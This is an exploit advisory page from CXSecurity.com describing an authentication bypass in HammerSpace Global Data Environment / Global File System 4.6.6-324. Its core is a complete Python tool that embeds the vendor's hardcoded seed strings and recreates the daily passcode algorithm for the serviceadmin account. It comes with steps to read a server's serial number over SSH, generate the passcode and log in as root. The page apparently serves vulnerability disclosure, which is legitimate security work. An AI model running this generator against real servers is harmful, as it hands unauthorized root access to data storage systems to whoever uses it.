@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>HammerSpace GDE / GFS 4.6.6-324 Authentication Bypass - CXSecurity.com</TITLE>
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+    <meta name="keywords"
+          content="HammerSpace, GDE, /, GFS, 4.6.6-324, Authentication, Bypass, exploit, vulnerability, bug, issue, advisories">
+    <meta name="description"
+          content="Justin Oberdorf has realised a new security note HammerSpace GDE / GFS 4.6.6-324 Authentication Bypass ">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <link rel="manifest" href="/manifest.json?b">
+    <link rel="Icon" href="https://cert.cx/cxstatic/favicon.ico" type="image/x-icon">
+    <script type="text/javascript" src="https://cert.cx/cxstatic/js/m-jq.js?T"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script type="text/javascript" src="https://cert.cx/cxstatic/js/m.js?V"></script>
+    <link href="https://cert.cx/cxstatic/css/b.css?G" rel="stylesheet" type="text/css"/>
+</HEAD>
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-39628967-1']);
+    _gaq.push(['_trackPageview']);
+    (function () {
+        var ga = document.createElement('script');
+        ga.type = 'text/javascript';
+        ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+<body ng-app="ui.bootstrap.demo">
+<div class="navbar navbar-default navbar-fixed-top" id="frezz">
+    <div class="container">
+        <div class="navbar-header"><a class="navbar-brand" href="https://cxsecurity.com/"><img
+                src="https://cert.cx/cxstatic/images/12018/cxseci.png" width="150" height="20" alt="Home Page"></a>
+            <button class="navbar-t
+oggle" type="button" data-toggle="collapse" data-target="#navbar-main"><span class="icon-bar"></span><span
+                    class="icon-bar"></span><span class="icon-bar"></span></button>
+        </div>
+        <div class="navbar-collapse collapse" id="navbar-main"><
+            ul class="nav navbar-nav">
+            <li><a href="https://cxsecurity.com/">Home</a></li>
+            <li class="active">
+                <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button"
+                   aria-expanded="false">Bugtraq<span class="caret"></span></a>
+                <ul class="dropdown-menu" role="menu">
+                    <li><a href="https://cxsecurity.com/wlb/">Full List</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/bugs/">Only Bugs</a></li>
+                    <li><a href="https://cxsecurity.com/tricks/">Only Tricks</a></li>
+                    <li><a href="https://cxsecurity.com/exploit/">Only Exploits</a></li>
+                    <li><a href="https://cxsecurity.com/dorks/">Only Dorks</a></li>
+                    <li><a href="https://cxsecurity.com/cvelist/">Only CVE</a></li>
+                    <li><a href="https://cxsecurity.com/cwelist/">Only CWE</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/bogus/">Fake Notes</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/best/1/">Ranking</a></li>
+                </ul>
+            </li>
+            <li class="dropdown">
+                <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button"
+                   aria-expanded="false">CVEMAP<span class="caret"></span></a>
+                <ul class="dropdown-menu" role="menu">
+                    <li><a href="https://cxsecurity.com/cvemap/">Full List</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/cvevendors/">Show Vendors</a></li>
+                    <li><a href="https://cxsecurity.com/cveproducts/">Show Products</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/allcwe/">CWE Dictionary</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/cve/">Check CVE Id </a></li>
+                    <li><a href="https://cxsecurity.com/cwe/">Check CWE Id</a></li>
+                </ul>
+            </li>
+            <li class="dropdown">
+                <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button"
+                   aria-expanded="false">Search<span class="caret"></span></a>
+                <ul class="dropdown-menu" role="menu">
+                    <li><a href="https://cxsecurity.com/search/">Bugtraq</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/search/cve/">CVEMAP</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/search/author/">By author</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/cve/">CVE Id</a></li>
+                    <li><a href="https://cxsecurity.com/cwe/">CWE Id</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/cvevendors/">By vendors</a></li>
+                    <li><a href="https://cxsecurity.com/cveproducts/">By products</a></li>
+                </ul>
+            </li>
+            <li class="dropdown">
+                <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">RSS<span
+                        class="caret"></span></a>
+                <ul class="dropdown-menu" role="menu">
+                    <li><a href="https://cxsecurity.com/wlb/rss/all/">Bugtraq</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/cverss/fullmap/">CVEMAP</a></li>
+                    <li><a href="https://cxsecurity.com/cveproducts/">CVE Products</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/wlb/rss/vulnerabilities/">Bugs</a></li>
+                    <li><a href="https://cxsecurity.com/wlb/rss/exploit/">Exploits</a></li>
+                    <li><a href="https://cxsecurity.com/wlb/rss/dorks/">Dorks</a></li>
+                </ul>
+            </li>
+            <li class="dropdown">
+                <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">More<span
+                        class="caret"></span></a>
+                <ul class="dropdown-menu" role="menu">
+                    <li><a href="http://cifrex.org/">cIFrex</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://www.facebook.com/cxsec">Facebook</a></li>
+                    <li><a href="https://twitter.com/cxsecurity">Twitter</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/donate/">Donate</a></li>
+                    <li class="divider"></li>
+                    <li><a href="https://cxsecurity.com/wlb/about/">About</a></li>
+                </ul>
+            </li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right">
+                <li><a href="https://cxsecurity.com/wlb/add/">Submit</a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+<div id="general">
+    <table width="100%">
+        <tr>
+            <td width="6%"></TD>
+            <td id="boki"></TD>
+            <td id="glowna">
+                <center>
+                    <script src="https://www.google.com/recaptcha/api.js?onload=CaptchaCallback&render=explicit" async
+                            defer></script>
+                    <script type="text/javascript">
+                        var CaptchaCallback = function () {
+                            var recap1 = grecaptcha.render('Recaptcha1', {
+                                'sitekey': '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6',
+                                'theme': 'dark',
+                                'callback': 'setComIt'
+                            });
+                            var recap2 = grecaptcha.render('Recaptcha2', {
+                                'sitekey': '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6',
+                                'theme': 'dark',
+                                'callback': 'onSubmit'
+                            });
+                        };
+                    </script>
+                    <script type="text/javascript"
+                            src="https://cdnjs.cloudflare.com/ajax/libs/angular-sanitize/1.6.6/angular-sanitize.min.js"></script>
+                    <script type="text/javascript" src="https://cxsecurity.com/js/show.js"></script>
+                    <table cellpadding="0" cellspacing="0" width="100%">
+                        <tr>
+                            <td>
+                                <div ng-non-bindable>
+                                    <center><h4><b>HammerSpace GDE / GFS 4.6.6-324 Authentication Bypass</B></h4>
+                                        <div class="panel panel-default"
+                                        ">
+                                        <div class="panel-body">
+                                            <div class="container">
+                                                <div class="row">
+                                                    <div class="col-xs-12 col-md-3">
+                                                        <div class="well well-sm"><b>2023.05.09</b></div>
+                                                    </div>
+                                                    <div class="col-xs-12 col-md-6">
+                                                        <div class="well well-sm"><u>Credit:</U> <b> <a
+                                                                href="https://cxsecurity.com/author/Justin+Oberdorf/1/">Justin
+                                                            Oberdorf</a> </b>
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-xs-5 col-md-3">
+                                                        <div class="well well-sm">
+                                                            <u>Risk:</U> <b>
+                                                            <span class="label label-warning">Medium</span></b>
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-xs-3 col-md-3">
+                                                        <div class="well well-sm">
+                                                            <u>Local:</U> <b>No</b>
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-xs-4 col-md-3">
+                                                        <div class="well well-sm">
+                                                            <u>Remote:</U> <b><b>Yes</B></span></b>
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-xs-6 col-md-3">
+                                                        <div class="well well-sm">
+                                                            <u>CVE:</U> <b>N/A</b>
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-xs-6 col-md-3">
+                                                        <div class="well well-sm">
+                                                            <u>CWE:</U> <b>N/A</b></div>
+                                                    </div>
+                                                </div>
+                                                <p>
+                                                <table width="70%">
+                                                    <tr>
+                                                        <td>
+                                                            <script async
+                                                                    src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                                                            <ins class="adsbygoogle" style="display:block"
+                                                                 data-ad-client="ca-pub-5074670963595353"
+                                                                 data-ad-slot="9692700437"
+                                                                 data-full-width-responsive="true"
+                                                                 data-ad-format="auto"></ins>
+                                                            <script>
+                                                                (adsbygoogle = window.adsbygoogle || []).push({});
+                                                            </script>
+                                                        </TD>
+                                                    </TR>
+                                                </TABLE>
+                                                <p>
+                                    </CENTER>
+                                </div>
+</div>
+</div><p>
+<div style="white-space: pre-wrap; word-break: break-all;" ng-non-bindable>
+    <div class="well well-sm premex"># Affected Product: HammerSpace Global Data Environment / Global File System -
+        # https://hammerspace.com/product
+        #
+        # Affected Versions: v4.6.6-324 and below with default installation/configuration.
+        #
+        # Vendor Notified: Yes, sometime between: 08/2022 and 10/2022, confirmed 2023-03-21 there is a fix in
+        # an upcoming release
+        #
+        # Description:
+        #
+        # A utility that can generate the TOTP passcode used to sign In as the support service
+        # account user for HammerSpace GFS default installations. Both the OVA and ISO are effected.
+        #
+        # To utilize:
+        #
+        # 1. Attempt SSH login to a HammerSpace Anvil or Data Server and make note of the System S/N
+        # 2. Generate the password of the day for the service admin account:
+        # ./hsps-passgen.py —serials SERIALNUMBER
+        # 3. SSH as the service admin account to the server and specify the outputted TOTP passcode
+        # 4. Enjoy root
+        #
+        #
+        #!/usr/bin/env python3
+        import argparse, getpass, os, random, string, sys
+        from datetime import datetime
+        from random import Random
+        #make it python3 compatible thanks for changing random guys!
+        class HSRandom(Random):
+        def seed(self, seed):
+        if sys.version_info[0] == 3:
+        return super(HSRandom,self).seed(seed,version=1)
+        else:
+        return super(HSRandom,self).seed(seed)
+        def choice(self, seq):
+        if sys.version_info[0] == 3:
+        &quot;&quot;&quot;Choose a random element from a non-empty sequence.&quot;&quot;&quot;
+        return seq[int(super(HSRandom,self).random() * len(seq))] # raises IndexError if seq is empty
+        else:
+        return super(HSRandom, self).choice(seq)
+        VERSION = &quot;hspc-passgen v4.3.2&quot;
+        USAGE_DESC = &quot;No help.&quot;
+        PARSER = argparse.ArgumentParser(prog=&quot;hspc-passgen&quot;, description=&quot;Generates time of day passcode
+        for serviceadmin account used by Hammerspace&quot;)
+        PARSER.add_argument(&quot;-V&quot;, &quot;--version&quot;, action=&quot;store_true&quot;, help=&quot;Prints
+        version&quot;)
+        PARSER.add_argument(&quot;--debug&quot;, action=&quot;store_true&quot;, help=&quot;Debug Output&quot;)
+        PARSER.add_argument(&quot;--pwtype&quot;, type=int, default=3, choices=[2,3], help=&quot;Password type&quot;)
+        PARSER.add_argument(&quot;--datecode&quot;, type=str, default=datetime.now().strftime(&quot;%F&quot;), help=&quot;Date
+        Code&quot;)
+        PARSER.add_argument(&quot;--serials&quot;, type=str, nargs=&quot;+&quot;, required=True, help=&quot;Reported
+        serial number(s) from ssh: serviceadmin@host&quot;)
+        ARGS = PARSER.parse_args()
+        def exc_handler(exception_type, exception, traceback, debug_hook=sys.excepthook):
+        if ARGS.debug:
+        debug_hook(exception_type, exception, traceback)
+        else:
+        print(&quot;%s: %s&quot; % (exception_type.__name__, exception))
+        sys.exit(1)
+        sys.excepthook = exc_handler
+        def generate_password_v2(seed_str, _, length=8):
+        &quot;&quot;&quot;Generate a simple password seeded with supplied text&quot;&quot;&quot;
+        serial = seed_str[-5:].lower()
+        collapsed = (&quot;&quot;).join(disambiguate(x) for x in serial)
+        chars = string.digits
+        seed = &quot;&lt;~^~^~^Mr.Oftal_P^~^~^~&gt;&quot; + collapsed
+        hs_random = HSRandom(seed)
+        return (&quot;&quot;).join(hs_random.choice(chars) for i in range(length))
+        def generate_password_v3(seed_str, datecode, length=10):
+        &quot;&quot;&quot;Generate a stronger password seeded with supplied text&quot;&quot;&quot;
+        serial = seed_str[-8:].lower()
+        collapsed = (&quot;&quot;).join(disambiguate_v3(x) for x in serial)
+        chars = string.digits
+        seed = datecode + &quot;z97eoW8tVn3daG833DN83wY8&quot; + collapsed
+        hs_random = HSRandom(seed)
+        return (&quot;&quot;).join(hs_random.choice(chars) for i in range(length))
+        def generate_password(seed_str, datecode, pwtype=3):
+        return globals()[(&quot;generate_password_v&quot; + str(pwtype))](seed_str, datecode)
+        def disambiguate(char):
+        &quot;&quot;&quot;Substitute ambiguous characters with non-ambiguous ones&quot;&quot;&quot;
+        char = str(char)
+        if char in (&quot;1&quot;, &quot;I&quot;, &quot;!&quot;, &quot;|&quot;):
+        dis = &quot;l&quot;
+        elif char in (&quot;D&quot;, &quot;Q&quot;, &quot;O&quot;, &quot;0&quot;):
+        dis = &quot;o&quot;
+        elif char in (&quot;3&quot;, &quot;B&quot;, &quot;8&quot;, &quot;6&quot;):
+        dis = &quot;b&quot;
+        elif char in (&quot;5&quot;, &quot;S&quot;, &quot;$&quot;):
+        dis = &quot;s&quot;
+        elif char in (&quot;A&quot;, &quot;4&quot;):
+        dis = &quot;a&quot;
+        elif char in (&quot;V&quot;, &quot;U&quot;):
+        dis = &quot;u&quot;
+        elif char in (&quot;M&quot;, &quot;W&quot;):
+        dis = &quot;m&quot;
+        elif char in (&quot;C&quot;, &quot;(&quot;):
+        dis = &quot;c&quot;
+        else:
+        dis = char
+        return dis
+        def disambiguate_v3(char):
+        &quot;&quot;&quot;Substitute ambiguous characters with non-ambiguous ones&quot;&quot;&quot;
+        char = str(char)
+        if char in (&quot;L&quot;, &quot;1&quot;, &quot;I&quot;):
+        dis = &quot;l&quot;
+        elif char in (&quot;Q&quot;, &quot;O&quot;, &quot;0&quot;):
+        dis = &quot;o&quot;
+        elif char in (&quot;B&quot;, &quot;8&quot;):
+        dis = &quot;b&quot;
+        elif char in (&quot;5&quot;, &quot;S&quot;):
+        dis = &quot;s&quot;
+        elif char in (&quot;V&quot;, &quot;U&quot;):
+        dis = &quot;u&quot;
+        else:
+        dis = char
+        return dis
+        def main():
+        if ARGS.version:
+        print(VERSION)
+        return 0
+        if ARGS.pwtype not in (2, 3):
+        print(&quot;\nERROR: Invalid parameters.\n&quot;)
+        PARSER.print_help()
+        return 1
+        if ARGS.serials is None or len(ARGS.serials) == 0:
+        print(&quot;\nERROR: Invalid parameters.\n&quot;)
+        PARSER.print_help()
+        return 1
+        print(&quot;SERIAL - PASSCODE&quot;)
+        for serial in ARGS.serials:
+        print(f&quot;{serial} - {generate_password(serial, datecode=ARGS.datecode, pwtype=ARGS.pwtype)}&quot;)
+        if __name__ == &quot;__main__&quot;:
+        sys.exit(main())
+    </DIV>
+    </P><p class="txt" id="refer"></P></DIV>
+<div class="panel panel-default"
+">
+<div class="panel-body">
+    <center>
+        <table width="75%">
+            <tr>
+                <td>
+                    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                    <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5074670963595353"
+                         data-ad-slot="6599633238" data-full-width-responsive="true" data-ad-format="auto"></ins>
+                    <script>
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    </script>
+                </TD>
+            </TR>
+        </TABLE>
+        <br>
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12 col-md-6">
+                    <div class="well well-sm">
+                        <center><a href="https://cxsecurity.com/ascii/WLB-2023050027"><font size="4"><b>See this note in
+                            RAW Version</b></FONT></A></CENTER>
+                    </div>
+                </div>
+                <div class="col-xs-6 col-md-3">
+                    <div class="well well-sm">
+                        <a href="https://twitter.com/share" class="twitter-share-button" data-count="none">Tweet</a>
+                        <script>!function (d, s, id) {
+                            var js, fjs = d.getElementsByTagName(s)[0],
+                                p = /^http:/.test(d.location) ? 'http' : 'https';
+                            if (!d.getElementById(id)) {
+                                js = d.createElement(s);
+                                js.id = id;
+                                js.src = p + '://platform.twitter.com/widgets.js';
+                                fjs.parentNode.inser
+                                tBefore(js, fjs);
+                            }
+                        }(document, 'script', 'twitter-wjs');</script>
+                    </div>
+                </div>
+                <div class="col-xs-6 col-md-3">
+                    <div class="well well-sm">
+                        <div id="fb-root"></div>
+                        <script>(function (d, s, id) {
+                            var js, fjs = d.getElementsByTagName(s)[0];
+                            if (d.getElementById(id)) return;
+                            js = d.createElement(s);
+                            js.id = id;
+                            js.src = "//connect.facebook.net/pl_PL/sdk.js#xfbml=1&version=v2.3";
+                            fjs.parentNode.insertBefore(js, fjs);
+                        }(document, 'script', 'facebook-jssdk'));</script>
+                        <div class="fb-like" data-href="https://cxsecurity.com/issue/WLB-2023050027" data-width="50"
+                             data-layout="button" data-action="like" data-show-faces="false" data-share="false"></div>
+                    </div>
+                </div>
+                <div class="col-xs-12 col-md-12">
+                    <div class="well well-sm">
+                        <div class="container">
+                            <div class="group-form inline">
+                                <div class="col-sm-12 col-md-6" valign="middle">
+                                    Vote for this issue:
+                                    <input type="hidden" id="numberWlb" value="2023050027">
+                                    <button type="button" id="dodatnie"
+                                            class="btn btn-success glyphicon glyphicon-thumbs-up"
+                                            data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"
+                                            onclick="setPositive()" onload="alreV()" value="0"> 0
+                                    </button>
+                                    <button type="button" id="ujemne"
+                                            class="btn btn-danger glyphicon glyphicon-thumbs-down"
+                                            data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"
+                                            onclick="setNegative()" value="0"> 0
+                                    </button>
+                                </div>
+                                <div class="col-sm-11 col-md-5" valign="middle" id="barr">
+                                    <div class="progress progress-striped" style="margin-top: 11px;">
+                                        <div class="progress-bar progress-bar-success active" id="dodatnieBar"
+                                             data-toggle="collapse" data-target="#voteCaptcha" onclick="setPositive()"
+                                             onload="alreV()" style="width: 50%">
+                                            <div id="valGreBar">50%</div>
+                                        </div>
+                                        <div class="progress-bar progress-bar-danger active" id="ujemneBar"
+                                             class="btn btn-danger glyphicon glyphicon-thumbs-down"
+                                             data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"
+                                             onclick="setNegative()" style="wi
+dth: 50%">
+                                            <div id="valRedBar">50%</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="voteCaptcha" class="collapse">
+                            <br>
+                            <div class="g-recaptcha" id="Recaptcha2"></div>
+                        </div>
+                        <div id="thanksVote">
+                            <br>&nbsp;<br>
+                            <div class="alert alert-success" style="background-color: #556B2F;">
+                                <h4><strong>Thanks for you vote!</strong></h4></div>
+                        </div>
+                        <div id="thanksComm">
+                            <br>&nbsp;<br>
+                            <div class="alert alert-success" style="background-color: #556B2F;">
+                                <h4><strong>Thanks for you comment!</strong><br>Your message is in quarantine 48 hours.
+                                </h4></div>
+                        </div>
+    </CENTER>
+</div>
+</div></div>
+<div id="cWlb">
+    <div class="well well-sm"><input name="wlb" value="2023050027" type="hidden">
+        <fieldset>
+            <legend>Comment it here.</legend>
+            <div class="form-group form-horizontal">
+                <label for="inputNick" class="col-lg-1 control-label">Nick (*)</label>
+                <div class="col-lg-11"><input name="n" class="form-control" id="inputNick" placeholder="Nick"
+                                              style="background-color: black;"
+                                              onchange="document.getElementById('commCaptcha').style.display='block';">
+                </div>
+            </div>
+            <div class="form-group form-horizontal">
+                <label for="inputEmail" class="col-lg-1 control-label">Email (*)</label>
+                <div class="col-lg-11"><input name="e" class="form-control" id="inputEmail" placeholder="Email"
+                                              style="background-color: black;"></div>
+            </div>
+            <div class="form-group form-horizontal">
+                <label for="inputYoutube" class="col-lg-1 control-label">Video </label>
+                <div class="col-lg-11"><input name="v" class="form-control" id="inputVideo"
+                                              placeholder="Link to Youtube" style="background-color: black;"></div>
+            </div>
+            <div class="form-group form-horizontal">
+                <label for="textArea" class="col-lg-1 control-label">Text (*)</label>
+                <div class="col-lg-11">
+                    <textarea name="c" class="form-control" rows="6" id="inputComment"
+                              style="background-color: black;"></textarea></div>
+            </div>
+            <div class="form-group form-horizontal">
+                <div class="col-lg-12" id="commCaptcha" class="collapse"><br>
+                    <center>
+                        <div id="Recaptcha1"></div>
+                        <br>
+                        <small>(*) - <cite title="requi">required fields. </cite></small> &nbsp;
+                        <button type="reset" class="btn btn-default"
+                                style="background-color: transparent; margin-left: 0px; margin-right: 0px;">Cancel
+                        </button>
+                        <button type="submit" id="wysl"
+                                style="background-color: black; margin-left: 0px; margin-right: 0px;"
+                                class="btn btn-default" onclick="comIt()">Submit
+                        </button>
+                    </CENTER>
+                </div>
+            </div>
+        </fieldset>
+    </div>
+</div>
+<div ng-app="ui.bootstrap.demo" ng-controller="myCtrl">
+    <div ng-repeat="x in comments">
+        <div class="well well-sm">
+            <table width="100%">
+                <tr>
+                    <td width="7%">
+                        <div ng-bind-html="x.video"></div>
+                    </TD>
+                    <td style="max-width: 100%;overflow: visible;">
+                        <div align="left" class="breakcx" id="breakcx"><u><b>{{ x.nick }}</b></U> <img width="20"
+                                                                                                       height="14" ng-sr
+                                                                                                       c="https://cxsecurity.com/images/flags/{{ x.country }}.png">
+                            | <u>Date:</U> {{ x.ux * 1000 | date:'yyyy-MM-dd' }} <i>{{ x.ux * 1000 | date:'HH:mm' }}</I>
+                            CET+1
+                            <hr style="padding: 0px; margin: 5px;">
+                            <div style="white-space: pre-wrap;
+">{{ x.comment }}
+                            </DIV>
+                        </div>
+                    </TD>
+                </TR>
+            </table>
+        </div>
+    </div>
+    <button type="button" id="shomor" class="btn btn-link btn-block" ng-click="getNextCom()">Show all comments</button>
+</div>
+</div></div></CENTER>
+</TD></TR></TABLE>
+<script>
+    $("#thanksComm").hide();
+    $("#cWLb").hide();
+    $("#thanksVote").hide();
+    $("#commCaptcha").hide();
+    if (localStorage.vote2023050027 == 1) {
+        document.getElementById('voteCaptcha').style.display = 'none';
+        document.getElementById("dodatnie").disabled = true;
+        document.getElementById("ujemne").disabled = true;
+    }</script>
+<hr>
+Copyright <b>2023</b>, cxsecurity.com<p>&nbsp;
+    </TD>
+<td id="boki"></TD>
+<td width="6%"></TD>
+</TR>
+</TABLE>
+<a href="#" class="back-to-top">Back to Top</a>
+</DIV>
+</DIV>
+</BODY>
+</HTML>
